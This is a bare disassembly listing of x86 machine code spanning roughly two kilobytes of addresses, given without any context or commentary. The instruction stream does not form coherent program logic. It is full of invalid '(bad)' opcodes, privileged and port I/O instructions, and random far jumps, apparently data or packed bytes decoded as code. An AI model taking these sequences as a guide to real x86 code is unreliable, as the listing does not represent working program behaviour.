  40950f:	pop    es
  409510:	jns    0x40951f
  409512:	xchg   edx,eax
  409513:	icebp  
  409514:	mov    ch,0x46
  409516:	scas   al,BYTE PTR es:[edi]
  409517:	jae    0x409513
  409519:	ja     0x40952d
  40951b:	ds pop es
  40951d:	mov    ds:0xcdba0c75,eax
  409522:	sub    al,0xf4
  409524:	adc    edi,DWORD PTR [esi]
  409526:	pop    esi
  409527:	jo     0x409521
  409529:	xor    dl,bh
  40952b:	outs   dx,BYTE PTR ds:[esi]
  40952c:	mov    DWORD PTR [ecx],esp
  40952e:	ror    BYTE PTR [edi],1
  409530:	pop    esp
  409531:	mov    eax,ds:0xba8ff050
  409536:	mov    bl,0x74
  409538:	(bad)  
  409539:	retf   
  40953a:	mov    edi,cs
  40953c:	dec    ebp
  40953d:	xchg   ebx,eax
  40953e:	int    0xc0
  409540:	sbb    ecx,DWORD PTR [ebx]
  409542:	pusha  
  409543:	repnz test BYTE PTR [esi],0x13
  409547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409548:	cs jb  0x40955f
  40954b:	jns    0x409527
  40954d:	jge    0x4095a7
  40954f:	mov    esi,0x50dcda1d
  409554:	mov    DWORD PTR [edx-0x4c9811e8],eax
  40955a:	or     BYTE PTR [eax+0x5e709b79],ch
  409560:	pop    es
  409561:	jo     0x409568
  409563:	daa    
  409564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409565:	inc    eax
  409566:	test   BYTE PTR [edi+esi*4+0x31ae08c4],bl
  40956d:	lahf   
  40956e:	js     0x4095eb
  409570:	std    
  409571:	xor    eax,0x18c087a6
  409576:	xchg   DWORD PTR [edi+0x27],edi
  409579:	fs mov eax,0x518efb1f
  40957f:	push   ebp
  409580:	imul   edx,DWORD PTR [edx],0xffffffb4
  409583:	nop
  409584:	daa    
  409585:	fnstcw WORD PTR [eax]
  409587:	loopne 0x4095ab
  409589:	test   DWORD PTR [ebx+0x3f],ecx
  40958c:	mov    DWORD PTR [ebp+0x1920cb62],ecx
  409592:	mov    ebx,0xf3b96e61
  409597:	xchg   esi,eax
  409598:	div    ah
  40959a:	pop    ss
  40959b:	lea    esp,[ecx-0x7718cdbe]
  4095a1:	adc    ecx,DWORD PTR [eax+0x23]
  4095a4:	mov    esp,0x18443853
  4095a9:	and    eax,0x3757f4de
  4095ae:	push   cs
  4095af:	sub    dh,dh
  4095b1:	in     eax,dx
  4095b2:	mov    esi,0x80814d8b
  4095b7:	or     ebp,ecx
  4095b9:	fwait
  4095ba:	das    
  4095bb:	aad    0x14
  4095bd:	lods   al,BYTE PTR ds:[esi]
  4095be:	fs iret 
  4095c0:	ror    BYTE PTR [edi-0x7dd0f9b5],1
  4095c6:	mov    esp,0xddb77418
  4095cb:	mov    DWORD PTR [eax],edi
  4095cd:	in     al,0x3c
  4095cf:	ds dec edx
  4095d1:	iret   
  4095d2:	mov    ah,0x1e
  4095d4:	cmp    DWORD PTR [esi-0x12e82435],edi
  4095da:	bound  edx,QWORD PTR [eax]
  4095dc:	icebp  
  4095dd:	mov    edx,0x2e36041e
  4095e2:	cmp    al,0xaf
  4095e4:	fisub  DWORD PTR cs:[edx]
  4095e7:	or     ah,ch
  4095e9:	xchg   edx,eax
  4095ea:	cmc    
  4095eb:	pop    ds
  4095ec:	out    dx,eax
  4095ed:	jb     0x409609
  4095ef:	mov    bl,0xdb
  4095f1:	es inc eax
  4095f3:	test   al,0x7d
  4095f5:	daa    
  4095f6:	js     0x4095db
  4095f8:	push   ecx
  4095f9:	out    dx,al
  4095fa:	hlt    
  4095fb:	jl     0x4095b9
  4095fd:	xor    eax,0xe7e4978d
  409602:	sub    eax,0xd3407cdb
  409607:	dec    ecx
  409608:	out    0x92,al
  40960a:	sub    cl,BYTE PTR [ebx+0x4a]
  40960d:	xor    edi,DWORD PTR [edi-0x62]
  409610:	out    dx,al
  409611:	in     eax,0x11
  409613:	adc    cl,BYTE PTR [ebp-0x64]
  409616:	bound  eax,QWORD PTR [ebx-0x51]
  409619:	sub    eax,0xdf960c66
  40961e:	rol    BYTE PTR [edx-0x335f431a],cl
  409624:	xor    al,ch
  409626:	scas   al,BYTE PTR es:[edi]
  409627:	xchg   BYTE PTR [edx],ah
  409629:	cmp    BYTE PTR [ebx+ebx*1],dl
  40962c:	int3   
  40962d:	add    edx,DWORD PTR [esi-0x48]
  409630:	inc    ecx
  409631:	(bad)
  409634:	(bad)  
  409635:	mov    ebx,0xf9930e9f
  40963a:	aad    0xeb
  40963c:	add    dh,BYTE PTR [esi]
  40963e:	test   DWORD PTR [ebx],esp
  409640:	push   ecx
  409641:	jae    0x409678
  409643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409644:	mov    ds:0x588a61a6,eax
  409649:	add    eax,0x296ed1da
  40964e:	dec    ecx
  40964f:	lahf   
  409650:	lea    ecx,[eax+0x210ba6b7]
  409656:	push   ds
  409657:	lahf   
  409658:	sbb    eax,0xb5166b08
  40965d:	mov    bl,BYTE PTR [eax-0x2c]
  409660:	push   esp
  409661:	add    dh,BYTE PTR [eax+0x2fdb84a0]
  409667:	imul   ecx,DWORD PTR fs:[ebp+eiz*4+0x2896fd62],0x25
  409670:	dec    BYTE PTR [esi+0x3ab63c80]
  409676:	mov    dl,BYTE PTR [ebp-0x23]
  409679:	pushf  
  40967a:	imul   ecx,DWORD PTR [eax],0xddbce295
  409680:	leave  
  409681:	ins    DWORD PTR es:[edi],dx
  409682:	mov    bl,0x38
  409684:	ja     0x409668
  409686:	data16 outs dx,BYTE PTR ds:[esi]
  409688:	inc    esi
  409689:	mov    eax,0x5abe6f4f
  40968e:	mov    bl,0xd2
  409690:	jl     0x409681
  409692:	sub    al,0x29
  409694:	pop    esp
  409695:	mov    BYTE PTR [eax],ch
  409697:	sbb    bl,bl
  409699:	fmulp  st(7),st
  40969b:	stc    
  40969c:	pop    esi
  40969d:	daa    
  40969e:	pop    edi
  40969f:	call   0xb4f9:0xa4d5d6a6
  4096a6:	xor    BYTE PTR [ebx],dh
  4096a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096a9:	mov    ah,0xcf
  4096ab:	inc    ecx
  4096ac:	add    al,0x64
  4096ae:	sub    eax,0xce172d0f
  4096b3:	push   ecx
  4096b4:	inc    eax
  4096b5:	call   0x7455:0xf8bec819
  4096bc:	cwde   
  4096bd:	aam    0xd5
  4096bf:	push   esp
  4096c0:	push   esi
  4096c1:	or     al,BYTE PTR ds:0xe1e00048
  4096c7:	xor    eax,0x6bdb65ff
  4096cc:	repnz dec edi
  4096ce:	jae    0x4096e0
  4096d0:	lds    esp,FWORD PTR [eax-0x4381d41d]
  4096d6:	sbb    BYTE PTR ds:0xc2e7503,0x96
  4096dd:	pop    eax
  4096de:	sbb    eax,0xeb92418c
  4096e3:	add    eax,0x6bd9684c
  4096e8:	aad    0xba
  4096ea:	mov    ds:0xca998677,al
  4096ef:	cld    
  4096f0:	sbb    al,0xb
  4096f2:	shl    bl,0xd1
  4096f5:	inc    eax
  4096f6:	jno    0x409709
  4096f8:	icebp  
  4096f9:	scas   al,BYTE PTR es:[edi]
  4096fa:	stc    
  4096fb:	call   0xc75029b3
  409700:	pop    edx
  409701:	test   al,0x49
  409703:	cmp    ch,dh
  409705:	xchg   DWORD PTR [ebp-0x4e],esi
  409708:	scas   al,BYTE PTR es:[edi]
  409709:	mov    ?,WORD PTR [esi-0x73]
  40970c:	xchg   esp,eax
  40970d:	xchg   ebp,eax
  40970e:	scas   eax,DWORD PTR es:[edi]
  40970f:	mov    edi,0x1823d4f
  409714:	(bad)  
  409715:	jnp    0x4096ef
  409717:	inc    eax
  409718:	inc    esp
  409719:	jno    0x409780
  40971b:	mov    ds:0x46a3b23b,al
  409720:	call   FWORD PTR [esi-0x431e2876]
  409726:	xchg   ebx,eax
  409727:	cli    
  409728:	pusha  
  409729:	xchg   BYTE PTR [eax+0x1a],ah
  40972c:	outs   dx,DWORD PTR ds:[esi]
  40972d:	(bad)  
  40972e:	repz jl 0x4097a7
  409731:	outs   dx,BYTE PTR ds:[esi]
  409732:	adc    ch,BYTE PTR [ebp-0x79]
  409735:	dec    eax
  409736:	cmp    edi,DWORD PTR [eax+0x9]
  409739:	add    BYTE PTR [esi-0x48],ch
  40973c:	jo     0x409784
  40973e:	mov    ds:0xafa6585e,al
  409743:	xchg   ebx,eax
  409744:	jb     0x4097a6
  409746:	push   edx
  409747:	in     eax,0xd0
  409749:	pop    esp
  40974a:	fsubr  DWORD PTR [ecx]
  40974c:	fs push edx
  40974e:	icebp  
  40974f:	rcr    BYTE PTR ds:0x4a5f03c,cl
  409755:	icebp  
  409756:	loop   0x409754
  409758:	add    esp,edi
  40975a:	mov    al,ds:0xc910d279
  40975f:	aad    0xfe
  409761:	xor    edi,edx
  409763:	enter  0xf198,0x77
  409767:	hlt    
  409768:	fucom  st(0)
  40976a:	mov    ah,0x3e
  40976c:	or     BYTE PTR [esi],cl
  40976e:	or     BYTE PTR [ebx-0x573a7031],cl
  409774:	push   0xffffffd2
  409776:	adc    dl,bl
  409778:	je     0x409790
  40977a:	cli    
  40977b:	pop    ecx
  40977c:	sub    bh,0x49
  40977f:	mov    eax,0xa513637b
  409784:	adc    al,0x4a
  409786:	inc    edx
  409787:	mov    edi,0xddfa2083
  40978c:	test   BYTE PTR [ebx-0x6b],ah
  40978f:	dec    esi
  409790:	sahf   
  409791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409792:	pop    ebx
  409793:	(bad)  
  409794:	cmp    BYTE PTR [ebp-0x2c88adde],ah
  40979a:	xchg   ecx,eax
  40979b:	sub    BYTE PTR [ebp-0x71eeaaae],dh
  4097a1:	and    eax,0x7f2c74ad
  4097a6:	lds    eax,FWORD PTR [edi+0x35]
  4097a9:	push   eax
  4097aa:	mov    al,0x10
  4097ad:	popa   
  4097ae:	inc    ebp
  4097af:	cli    
  4097b0:	scas   eax,DWORD PTR es:[edi]
  4097b1:	mov    WORD PTR [ebp+edx*2-0x2cb0c9d5],cs
  4097b8:	xchg   ebx,eax
  4097b9:	or     DWORD PTR ds:0x87da3ff,0xd4780853
  4097c3:	(bad)  
  4097c4:	fld    QWORD PTR [esi]
  4097c6:	mov    ds:0x91f7b009,al
  4097cb:	sbb    cl,0xf4
  4097ce:	inc    esi
  4097cf:	cwde   
  4097d0:	sub    eax,0x8059dc62
  4097d5:	pop    esp
  4097d6:	outs   dx,BYTE PTR ds:[esi]
  4097d7:	gs jbe 0x409784
  4097da:	dec    esp
  4097db:	and    eax,0x6621ef22
  4097e0:	xlat   BYTE PTR ds:[ebx]
  4097e1:	dec    eax
  4097e2:	aas    
  4097e3:	ja     0x4097f6
  4097e5:	xor    ecx,DWORD PTR [edx-0x74aede00]
  4097eb:	std    
  4097ec:	in     al,0x9
  4097ee:	mul    eax
  4097f0:	xlat   BYTE PTR ds:[ebx]
  4097f1:	jg     0x4097eb
  4097f3:	adc    BYTE PTR [esi+0xda75b1],ch
  4097f9:	jo     0x4097ab
  4097fb:	sub    edx,ebx
  4097fd:	bound  ebp,QWORD PTR ds:0x1d8b2fdf
  409803:	clc    
  409804:	inc    edx
  409805:	mov    edx,0xa676030b
  40980a:	sbb    BYTE PTR [edi+ebx*4+0x4e3538c2],ch
  409811:	push   esi
  409812:	cwde   
  409813:	jbe    0x409808
  409815:	loopne 0x4097b3
  409817:	sub    ebx,DWORD PTR [ebp-0x61225ce3]
  40981d:	xor    ebp,edx
  40981f:	ret    
  409820:	xorps  xmm4,XMMWORD PTR fs:[eax]
  409824:	loopne 0x4097cf
  409826:	jmp    0xaf61:0x8fc44c68
  40982d:	int    0xff
  40982f:	inc    edi
  409830:	push   ds
  409831:	mov    edi,DWORD PTR [edi+0x1ac0966a]
  409837:	sbb    dl,bh
  409839:	aam    0x18
  40983b:	lds    esp,FWORD PTR [edx+0x2a]
  40983e:	pop    ecx
  40983f:	mov    cl,0xbc
  409841:	test   al,0x1b
  409843:	dec    edi
  409844:	xor    al,0x3
  409846:	push   0x3f
  409848:	outs   dx,BYTE PTR ds:[esi]
  409849:	add    ecx,DWORD PTR [ebp+0x3]
  40984c:	and    bh,bh
  40984e:	outs   dx,BYTE PTR ds:[esi]
  40984f:	xor    bl,BYTE PTR [esi]
  409851:	stc    
  409852:	inc    esp
  409853:	fdiv   QWORD PTR [ebp-0x6b]
  409856:	mov    al,0x60
  409858:	gs push esp
  40985a:	arpl   WORD PTR [ebp-0x56],dx
  40985d:	adc    DWORD PTR [eax-0x47],edi
  409860:	outs   dx,DWORD PTR ds:[esi]
  409861:	or     esp,ebx
  409863:	enter  0xe784,0x18
  409867:	or     al,BYTE PTR [eax]
  409869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40986a:	push   ss
  40986b:	jbe    0x4098c0
  40986d:	(bad)  [eax+0x68]
  409870:	adc    BYTE PTR [edx],dl
  409872:	sub    al,0xcb
  409874:	pop    edx
  409875:	xchg   ebp,eax
  409876:	pop    edi
  409877:	inc    ebp
  409878:	jo     0x409882
  40987a:	dec    ecx
  40987b:	dec    edx
  40987c:	adc    ebx,DWORD PTR [ebp+ebx*4+0x186beb69]
  409883:	aam    0x33
  409885:	push   0x25dde9bb
  40988a:	out    0x4e,eax
  40988c:	inc    esi
  40988d:	and    ebx,0x1e
  409890:	mov    ebx,0xd3089f3
  409895:	xor    ecx,DWORD PTR [eax]
  409897:	int    0xfe
  409899:	rcl    BYTE PTR [edx],1
  40989b:	arpl   WORD PTR [ecx-0x5d],di
  40989e:	sub    al,0x31
  4098a0:	rol    DWORD PTR [ecx-0x21],cl
  4098a3:	out    0xe3,eax
  4098a5:	dec    eax
  4098a6:	pop    es
  4098a7:	mov    ss,WORD PTR [edi+0x7ef4d84f]
  4098ad:	fsub   st(2),st
  4098af:	adc    al,BYTE PTR [esi-0x56c65343]
  4098b5:	cld    
  4098b6:	push   edx
  4098b7:	pop    es
  4098b8:	add    BYTE PTR [esi],bh
  4098ba:	cmp    BYTE PTR [ebp+0x4e03014],dl
  4098c0:	(bad)  
  4098c1:	mov    WORD PTR [esi],fs
  4098c3:	mov    ecx,DWORD PTR [eax-0x4e]
  4098c6:	fwait
  4098c7:	aaa    
  4098c8:	mov    dh,0x46
  4098ca:	test   DWORD PTR [edi+eiz*8-0x5ffb7179],edi
  4098d1:	stc    
  4098d2:	push   esp
  4098d3:	pop    eax
  4098d4:	jge    0x409924
  4098d6:	push   esp
  4098d7:	push   eax
  4098d8:	mov    esi,0x91514fa5
  4098dd:	jns    0x409904
  4098df:	in     al,0xae
  4098e1:	fsub   DWORD PTR [esp+edx*4-0x31]
  4098e5:	call   0x266d:0x72a3df52
  4098ec:	dec    edx
  4098ed:	jbe    0x4098fe
  4098ef:	dec    edx
  4098f0:	add    eax,0x71ba97d0
  4098f5:	neg    DWORD PTR [ebp+0x36]
  4098f8:	fisub  DWORD PTR [eax+0x3]
  4098fb:	mov    ch,BYTE PTR [edi]
  4098fd:	dec    esp
  4098fe:	fnstsw WORD PTR [edx]
  409900:	test   al,0xad
  409902:	xchg   ebp,eax
  409903:	cmp    eax,esi
  409905:	sar    ebp,cl
  409907:	shl    DWORD PTR [esi],0xaf
  40990a:	mov    dh,0x2a
  40990c:	ins    DWORD PTR es:[edi],dx
  40990d:	mov    al,0x6a
  40990f:	push   eax
  409910:	and    BYTE PTR [ecx+0x4f5c53ab],dh
  409916:	scas   al,BYTE PTR es:[edi]
  409917:	data16 mov al,dl
  40991a:	(bad)  
  40991b:	femms  
  40991d:	clc    
  40991e:	retf   0x7912
  409921:	pop    ss
  409922:	sbb    eax,0xb457cadb
  409927:	repnz xor BYTE PTR ds:0x815f1657,ch
  40992e:	mov    dh,bh
  409930:	test   BYTE PTR [eax+ebp*2+0x48d190b],al
  409937:	add    BYTE PTR ds:0xf8559be0,bl
  40993d:	or     DWORD PTR [edx],eax
  40993f:	outs   dx,BYTE PTR ds:[esi]
  409940:	jmp    0x689f:0xb0dec661
  409947:	sub    DWORD PTR [edx-0x74],ecx
  40994a:	retf   0xdb41
  40994d:	sti    
  40994e:	sub    DWORD PTR [ebx+0x41513830],ebx
  409954:	pop    ecx
  409955:	aam    0x84
  409957:	dec    esi
  409958:	scas   al,BYTE PTR es:[edi]
  409959:	js     0x40996b
  40995b:	hlt    
  40995c:	aam    0xbd
  40995e:	js     0x40999c
  409960:	std    
  409961:	push   edx
  409962:	retf   0x850d
  409965:	fst    QWORD PTR [ecx]
  409967:	out    0x35,al
  409969:	imul   edi,DWORD PTR [ebp-0x65],0xe2b25131
  409970:	fs (bad) 
  409972:	in     al,dx
  409973:	push   cs
  409974:	inc    ecx
  409975:	xchg   ecx,eax
  409976:	inc    ebp
  409977:	stos   BYTE PTR es:[edi],al
  409978:	test   BYTE PTR [ebx],bh
  40997a:	sbb    ebx,DWORD PTR [esi+ebx*4+0x7f]
  40997e:	push   0x8cda7628
  409983:	(bad)  
  409984:	sti    
  409985:	icebp  
  409986:	pop    ss
  409987:	mov    cl,0x31
  409989:	inc    ecx
  40998a:	xor    al,BYTE PTR [eax-0x2419312d]
  409990:	loop   0x409929
  409992:	icebp  
  409993:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409994:	mov    dh,0x26
  409996:	call   0xd593a7f6
  40999b:	jnp    0x4099dd
  40999d:	pop    edx
  40999e:	lea    edi,gs:[ecx-0x45]
  4099a2:	jo     0x409991
  4099a4:	push   edi
  4099a5:	add    edx,DWORD PTR [eax-0x2]
  4099a8:	shr    BYTE PTR [edx+0x66],1
  4099ab:	push   ss
  4099ac:	das    
  4099ad:	xor    edx,DWORD PTR [edx]
  4099af:	mov    ah,0x39
  4099b1:	int3   
  4099b2:	xor    eax,0xd5f524de
  4099b7:	adc    ebx,DWORD PTR [edx+0x6074432f]
  4099bd:	call   FWORD PTR [esi-0xf]
  4099c0:	fucomip st,st(6)
  4099c2:	das    
  4099c3:	js     0x4099c8
  4099c5:	and    DWORD PTR [edi],ecx
  4099c7:	repnz bound ecx,QWORD PTR [eax]
  4099ca:	cmp    cl,dl
  4099cc:	add    BYTE PTR [edx+0xe7bdb96],ah
  4099d2:	cmc    
  4099d3:	hlt    
  4099d4:	fisub  DWORD PTR [ecx+ebx*2]
  4099d7:	adc    ch,BYTE PTR [ebp-0x30]
  4099da:	cmc    
  4099db:	fwait
  4099dc:	out    0xfe,al
  4099de:	js     0x409a2e
  4099e0:	push   ds
  4099e1:	addr16 jbe 0x4099de
  4099e4:	mov    ecx,0x3a514f18
  4099e9:	scas   eax,DWORD PTR es:[edi]
  4099ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099eb:	cmp    DWORD PTR [esi-0x5ba02898],edx
  4099f1:	(bad)  
  4099f2:	out    dx,eax
  4099f3:	(bad)  
  4099f4:	data16 test BYTE PTR [ecx],cl
  4099f7:	inc    esi
  4099f8:	xchg   BYTE PTR [edx+0x25749d11],bl
  4099fe:	sti    
  4099ff:	pop    esp
  409a00:	nop
  409a01:	test   eax,ebp
  409a03:	aad    0xca
  409a05:	jmp    0x79bc5246
  409a0a:	xlat   BYTE PTR ds:[ebx]
  409a0b:	call   0x49ddf43f
  409a10:	in     eax,dx
  409a11:	push   edi
  409a12:	(bad)  
  409a13:	aaa    
  409a14:	push   eax
  409a15:	ins    BYTE PTR es:[edi],dx
  409a16:	out    0xa2,eax
  409a18:	ja     0x409a2b
  409a1a:	dec    sp
  409a1c:	out    dx,eax
  409a1d:	mov    ebp,0x248286ee
  409a22:	sub    al,0x24
  409a24:	sbb    eax,0x3ae20d96
  409a29:	dec    ecx
  409a2a:	mov    al,0xb8
  409a2c:	pop    es
  409a2d:	ret    
  409a2e:	mov    BYTE PTR [ecx-0x3b],dl
  409a31:	dec    esi
  409a32:	loope  0x409a7d
  409a34:	dec    BYTE PTR [eax]
  409a36:	rdtsc  
  409a38:	(bad)  
  409a39:	daa    
  409a3a:	bound  ebx,QWORD PTR [edx-0x80]
  409a3d:	ins    BYTE PTR es:[edi],dx
  409a3e:	xchg   ebp,eax
  409a3f:	arpl   WORD PTR [ebx+0x26],di
  409a42:	sub    DWORD PTR [ecx-0x34],edx
  409a45:	(bad)  
  409a46:	sub    al,0x93
  409a48:	in     eax,dx
  409a49:	mov    eax,ds:0x7ea1b54c
  409a4e:	shr    dl,cl
  409a50:	pop    eax
  409a51:	(bad)  
  409a52:	iret   
  409a53:	mov    eax,ds:0x8d9deb11
  409a58:	inc    eax
  409a59:	push   cs
  409a5a:	or     eax,0x9b4c077f
  409a5f:	cmp    DWORD PTR [edi+0x28],esi
  409a62:	add    eax,0x83914467
  409a68:	push   cs
  409a69:	outs   dx,BYTE PTR ds:[esi]
  409a6a:	add    eax,0xe22d5f2b
  409a6f:	mov    dl,0x4e
  409a71:	icebp  
  409a72:	mul    DWORD PTR [ebx]
  409a74:	das    
  409a75:	lock js 0x409a48
  409a78:	mov    ebp,0x73b6aa7d
  409a7d:	and    al,0xb1
  409a7f:	arpl   WORD PTR [eax-0x26062198],bx
  409a85:	mov    dl,0xd9
  409a87:	jae    0x409afb
  409a89:	adc    eax,0x26a4a60f
  409a8e:	inc    eax
  409a8f:	inc    esi
  409a90:	sub    dh,BYTE PTR [edi+edx*8-0x1ec485af]
  409a97:	adc    al,0xad
  409a99:	mov    bl,0xbf
  409a9b:	adc    eax,0x20bbc550
  409aa0:	ins    DWORD PTR es:[edi],dx
  409aa1:	es jl  0x409a82
  409aa4:	adc    eax,0x512f6ab6
  409aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aaa:	or     BYTE PTR [ebx-0x29b5386b],0x68
  409ab1:	push   cs
  409ab2:	jae    0x409aac
  409ab4:	mov    esp,0x8b07e39f
  409ab9:	fist   WORD PTR [ebx+0x79]
  409abc:	imul   edi,DWORD PTR [esp+ebx*1+0x21d916cf],0x842e0417
  409ac7:	sbb    eax,0x6b781bb
  409acc:	out    0xc7,al
  409ace:	mov    esp,0xb0b6d342
  409ad3:	mov    eax,ds:0x4e069d12
  409ad8:	push   ebp
  409ad9:	push   0xffffffcc
  409adb:	mov    al,0xa
  409add:	fwait
  409ade:	push   ss
  409adf:	sbb    al,BYTE PTR ds:0x14db548c
  409ae5:	fdivr  DWORD PTR [edx-0x7adf1555]
  409aeb:	or     eax,0x790352df
  409af0:	fild   QWORD PTR [ebx-0x3d]
  409af3:	dec    edx
  409af4:	stos   DWORD PTR es:[edi],eax
  409af5:	cmp    BYTE PTR [eax],0xcc
  409af8:	fwait
  409af9:	cdq    
  409afa:	sub    al,bl
  409afc:	sbb    al,0xbb
  409afe:	outs   dx,BYTE PTR ds:[esi]
  409aff:	pop    eax
  409b00:	push   ecx
  409b01:	xchg   ecx,eax
  409b02:	jp     0x409abe
  409b04:	pop    ds
  409b05:	xchg   esp,eax
  409b06:	and    DWORD PTR [esp+esi*8-0x29],0xe137d6bd
  409b0e:	jns    0x409b46
  409b10:	inc    eax
  409b11:	inc    ecx
  409b12:	mov    ch,0xab
  409b14:	mov    dh,0x95
  409b16:	pushf  
  409b17:	jl     0x409b46
  409b19:	jo     0x409b89
  409b1b:	ja     0x409b8d
  409b1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b1e:	adc    al,BYTE PTR [ecx]
  409b20:	jnp    0x409ac9
  409b22:	pop    esp
  409b23:	dec    ecx
  409b24:	adc    dh,cl
  409b26:	adc    eax,0x26b551bd
  409b2b:	aaa    
  409b2c:	test   al,0x3d
  409b2e:	pop    edi
  409b2f:	mov    dl,0xb
  409b31:	gs icebp 
  409b33:	ins    DWORD PTR es:[edi],dx
  409b34:	das    
  409b35:	mov    dh,0x99
  409b37:	in     al,0x6b
  409b39:	outs   dx,BYTE PTR ds:[esi]
  409b3a:	les    edi,FWORD PTR [ecx+eax*4+0xe24a590]
  409b41:	aaa    
  409b42:	dec    ecx
  409b43:	and    eax,0x51e0dc0d
  409b48:	or     DWORD PTR [ecx],ebx
  409b4a:	dec    ebp
  409b4b:	lods   al,BYTE PTR ds:[esi]
  409b4c:	mov    ebx,DWORD PTR [ebp-0x548f706d]
  409b52:	jl     0x409b1e
  409b54:	dec    esp
  409b55:	loop   0x409b1d
  409b57:	aam    0xd5
  409b59:	clc    
  409b5a:	inc    ebp
  409b5b:	sbb    DWORD PTR [ebx+0x49c46a21],esp
  409b61:	pop    eax
  409b62:	ret    0x2d0e
  409b65:	inc    esi
  409b66:	jne    0x409bce
  409b68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b69:	mov    bl,BYTE PTR [edx-0x39]
  409b6c:	xchg   ebx,ecx
  409b6e:	sub    BYTE PTR [ebx-0x75c5706a],dl
  409b74:	and    eax,0x15c7eb74
  409b79:	push   ds
  409b7a:	sub    al,0xf1
  409b7c:	cli    
  409b7d:	(bad)  
  409b7e:	jns    0x409bca
  409b80:	(bad)  
  409b81:	clc    
  409b82:	jge    0x548a3724
  409b88:	out    dx,eax
  409b89:	add    esp,esi
  409b8b:	es push 0x20c647c0
  409b91:	leave  
  409b92:	test   BYTE PTR [edi-0xbef7f4a],bh
  409b98:	lods   al,BYTE PTR ds:[esi]
  409b99:	cmp    bh,BYTE PTR [esi-0x217b7153]
  409b9f:	repnz and ecx,DWORD PTR [esi]
  409ba2:	fwait
  409ba3:	dec    ecx
  409ba4:	and    eax,0x2ead8b81
  409ba9:	add    eax,0xc29005b9
  409bae:	jecxz  0x409be1
  409bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bb1:	adc    ebp,DWORD PTR [esi-0x8]
  409bb4:	sbb    al,0x10
  409bb6:	inc    edx
  409bb7:	sbb    al,0xd7
  409bb9:	bound  esp,QWORD PTR [ebp+0x58]
  409bbc:	push   ecx
  409bbd:	xor    al,0x5c
  409bbf:	pop    ecx
  409bc0:	sbb    al,0xe9
  409bc2:	sub    al,0x33
  409bc4:	dec    esp
  409bc5:	cmp    eax,eax
  409bc7:	gs xchg esp,eax
  409bc9:	mov    esi,0x4245e8a5
  409bce:	lea    ecx,[esi-0x27]
  409bd1:	imul   ecx,edi,0xa46b1e9d
  409bd7:	pop    ebp
  409bd8:	les    ecx,FWORD PTR [ebx-0x19]
  409bdb:	sub    al,0x41
  409bdd:	jbe    0x409ba9
  409bdf:	les    edi,FWORD PTR [edx+eiz*1+0x250b22a2]
  409be6:	or     al,ch
  409be8:	pop    esi
  409be9:	and    esi,ecx
  409beb:	push   es
  409bec:	fisttp QWORD PTR [edi-0x42]
  409bef:	jnp    0x409be3
  409bf1:	rol    DWORD PTR [esi],cl
  409bf3:	sbb    ch,0x49
  409bf6:	(bad)  
  409bf7:	dec    ebp
  409bf8:	or     eax,ebx
  409bfa:	jns    0x409c42
  409bfc:	mov    ds:0x9cd2f409,al
  409c01:	push   eax
  409c02:	in     al,0x12
  409c04:	pushf  
  409c05:	sbb    DWORD PTR [eax],edi
  409c07:	mov    BYTE PTR [ebp+esi*2+0x4fc9454f],ch
  409c0e:	inc    esp
  409c0f:	scas   al,BYTE PTR es:[edi]
  409c10:	pop    ebp
  409c11:	add    DWORD PTR [edx+eiz*4],esp
  409c14:	mov    cl,0x75
  409c16:	add    DWORD PTR [edi-0x55102d17],0xffffff8e
  409c1d:	add    DWORD PTR [eax-0x191192e2],0xc12d58cb
  409c27:	mov    DWORD PTR [ecx+0x35],ecx
  409c2a:	fisubr DWORD PTR [ebp-0x51]
  409c2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c2e:	retf   
  409c2f:	ss popa 
  409c31:	imul   esi,DWORD PTR [edx+0x66],0xffffffa6
  409c35:	cmp    al,0x77
  409c37:	add    eax,0x3eb28565
  409c3c:	call   0x854d:0x35d2a07f
  409c43:	data16 outs dx,BYTE PTR ds:[esi]
  409c45:	sbb    eax,0x4d5359fd
  409c4a:	mov    ah,0x64
  409c4c:	sbb    ebx,DWORD PTR [edx+0x667e35fb]
  409c52:	add    ecx,DWORD PTR [edi+0x3a]
  409c55:	dec    ebx
  409c56:	xor    BYTE PTR [edi+0x44],cl
  409c59:	jle    0x409c6c
  409c5b:	xlat   BYTE PTR ds:[ebx]
  409c5c:	jl     0x409cb1
  409c5e:	lea    edx,[edi-0x41cf29ea]
  409c64:	mov    ah,0xc1
  409c66:	jo     0x409c98
  409c68:	xchg   edx,eax
  409c69:	out    dx,al
  409c6a:	(bad)  
  409c6b:	adc    ebx,esp
  409c6d:	fcomp  QWORD PTR [edi+0x18]
  409c70:	xlat   BYTE PTR ds:[ebx]
  409c71:	mov    ch,ch
  409c73:	out    dx,eax
  409c74:	or     eax,0xc0989cfd
  409c79:	mov    bl,0xd1
  409c7b:	in     eax,dx
  409c7c:	adc    al,0x46
  409c7e:	mov    DWORD PTR [ecx],ebp
  409c80:	dec    esi
  409c81:	outs   dx,BYTE PTR ds:[esi]
  409c82:	xchg   edi,eax
  409c83:	push   esp
  409c84:	inc    ebp
  409c85:	(bad)  [eax+ecx*1+0x4]
  409c89:	cli    
  409c8a:	icebp  
  409c8b:	or     DWORD PTR [edx+ebx*2-0x75],esp
  409c8f:	xchg   esi,eax
  409c90:	std    
  409c91:	add    BYTE PTR [edi+0x4d6731bc],cl
  409c97:	out    0xbd,al
  409c99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c9a:	and    al,0xe9
  409c9c:	jge    0x409c47
  409c9e:	(bad)  
  409c9f:	sbb    eax,0xdd5594df
  409ca4:	loop   0x409c7b
  409ca6:	ins    DWORD PTR es:[edi],dx
  409ca7:	out    dx,al
  409ca8:	rcr    edx,1
  409caa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cab:	retf   
